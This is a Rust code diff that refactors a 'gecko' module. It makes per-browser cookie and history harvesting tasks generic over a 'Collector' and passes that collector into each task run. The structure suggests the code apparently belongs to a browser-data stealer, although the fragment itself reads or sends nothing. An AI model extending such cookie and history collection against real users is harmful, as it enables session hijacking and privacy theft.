@@ -1,20 +1,21 @@
 mod cookies;
 mod history;
 
+use crate::gecko::cookies::CookiesTask;
+use crate::gecko::history::HistoryTask;
 use crate::vec;
 use alloc::sync::Arc;
 use alloc::vec::Vec;
+use collector::Collector;
 use core::ops::Deref;
 use tasks::{composite_task, CompositeTask, Task};
 use utils::path::Path;
-use crate::gecko::cookies::CookiesTask;
-use crate::gecko::history::HistoryTask;
 
-pub struct GeckoTask<'a> {
-    tasks: Vec<(Arc<GeckoBrowserData<'a>>, CompositeTask)>
+pub struct GeckoTask<'a, C: Collector> {
+    tasks: Vec<(Arc<GeckoBrowserData<'a>>, CompositeTask<C>)>
 }
 
-impl GeckoTask<'_> {
+impl<C: Collector> GeckoTask<'_, C> {
     pub(crate) fn new() -> Self {
         let all_browsers = get_gecko_browsers();
         let mut tasks = Vec::new();
@@ -39,11 +40,11 @@ impl GeckoTask<'_> {
     }
 }
 
-impl Task for GeckoTask<'_> {
-    unsafe fn run(&self, parent: &Path) {
+impl<C: Collector> Task<C> for GeckoTask<'_, C> {
+    unsafe fn run(&self, parent: &Path, collector: &C) {
         for (browser, task) in &self.tasks {
             let parent = parent / browser.name;
-            unsafe { task.run(&parent) }
+            unsafe { task.run(&parent, collector) }
         }
     }
 }
